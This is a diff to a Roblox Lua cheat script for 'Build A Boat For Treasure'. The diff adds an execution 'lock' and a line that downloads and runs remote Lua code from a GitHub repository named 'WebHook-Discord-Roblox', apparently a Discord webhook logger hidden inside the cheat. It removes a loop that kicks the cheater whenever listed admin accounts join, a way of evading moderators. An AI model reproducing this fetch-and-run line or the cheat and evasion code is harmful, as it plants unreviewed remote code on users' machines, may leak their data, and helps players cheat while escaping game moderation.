@@ -11,6 +11,17 @@ else
     game.Players.LocalPlayer:Kick("Banned | Reason: Cheating")
 end
 
+local allowExecution = true
+
+print("Script Execution is Allowed.")
+
+if not allowExecution then
+    game.Players.LocalPlayer:Kick("Script Execution is Currently Locked. [Dm: peatchXD#6075]")
+    return
+end
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/GODMODs132/WebHook-Discord-Roblox/main/Script.lua"),true))()
+
 ------------------------------------------------------------------------------------------
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/GUI"))() 
@@ -591,58 +602,3 @@ po.ChildAdded:connect(function(a)
         until false
     end
 end)
-
-------------------------------------------------------------------------------------------
--- Auto Kicked Admin Join Server --
-
-while true do
-    if game.Players.SahawazX then
-        game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-        wait()
-       end
-    end
-
-    while true do
-        if game.Players.NEWBOXQ then
-            game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-            wait()
-           end
-        end
-
-        while true do
-            if game.Players.XieRa_AshRing then
-                game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                wait()
-               end
-            end
-
-            while true do
-                if game.Players.IBlueberrieSZI then
-                    game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                    wait()
-                   end
-                end
-
-                while true do
-                    if game.Players.kyouncee3 then
-                        game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                        wait()
-                       end
-                    end
-
-                    while true do
-                        if game.Players.Szzme then
-                            game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                            wait()
-                           end
-                        end
-
-                        while true do
-                            if game.Players.lazyloxy_warmlight then
-                                game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                                wait()
-                               end
-                            end
-                        
-------------------------------------------------------------------------------------------
-
